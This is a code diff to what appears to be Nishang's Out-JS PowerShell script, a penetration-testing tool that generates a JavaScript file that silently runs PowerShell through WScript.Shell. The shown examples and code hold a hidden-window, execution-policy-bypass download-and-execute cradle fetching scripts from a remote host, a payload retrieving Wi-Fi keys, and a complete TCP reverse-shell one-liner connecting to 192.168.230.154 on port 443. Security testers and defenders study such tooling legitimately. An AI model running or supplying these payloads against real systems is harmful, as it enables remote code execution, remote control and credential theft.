@@ -24,18 +24,23 @@ Path to the directory where the files would be saved. Default is the current dir
 .EXAMPLE
 PS > Out-JS -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53"
 
-Use above when you want to use the default payload, which is a powershell download and execute one-liner. A file 
+Use above when you want to use the payload which is a powershell download and execute one-liner. A file 
 named "Style.js" would be generated in the current directory.
 
-
+.EXAMPLE
 PS > Out-JS -PayloadURL http://192.168.230.1/Powerpreter.psm1 -Arguments "Get-Information;Get-Wlan-Keys"
 
 Use above command for multiple payloads.
 
-
-PS > Out-JS -Payload "`$sm=(New-Object Net.Sockets.TCPClient('192.168.230.154',443)).GetStream();[byte[]]`$bt=0..65535|%{0};while((`$i=`$sm.Read(`$bt, 0, `$bt.Length)) -ne 0){;`$d=(New-Object Text.ASCIIEncoding).GetString(`$bt,0, `$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb + 'PS ' + (pwd).Path + '> ';`$sb=([text.encoding]::ASCII).GetBytes(`$sb2);`$sm.Write(`$sb,0,`$sb.Length);`$sm.Flush()}"
+.EXAMPLE
+PS > Out-JS -Payload "powershell.exe -w h -nologo -noprofile -ep bypass `$sm=(New-Object Net.Sockets.TCPClient('192.168.230.154',443)).GetStream();[byte[]]`$bt=0..65535|%{0};while((`$i=`$sm.Read(`$bt, 0, `$bt.Length)) -ne 0){;`$d=(New-Object Text.ASCIIEncoding).GetString(`$bt,0, `$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb + 'PS ' + (pwd).Path + '> ';`$sb=([text.encoding]::ASCII).GetBytes(`$sb2);`$sm.Write(`$sb,0,`$sb.Length);`$sm.Flush()}"
 
 Use above for a Reverse PowerShell Session. Note that there is no need of download-execute in this case.
+
+.EXAMPLE
+PS > Out-JS -Payload "calc.exe"
+
+Use above for executing a custom payload.
 
 .LINK
 http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html
@@ -62,15 +67,14 @@ https://github.com/samratashok/nishang
     )
 
     #Check if the payload has been provided by the user
-    if(!$Payload)
+    if($PayloadURL)
     {
-        $Payload = "IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
+        $Payload = "powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments"
     }  
     
     $cmd = @"
-ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';
 c = "$Payload";
-r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true);
+r = new ActiveXObject("WScript.Shell").Run(c,0,true);
 "@
 
     Out-File -InputObject $cmd -FilePath $OutputPath -Encoding default
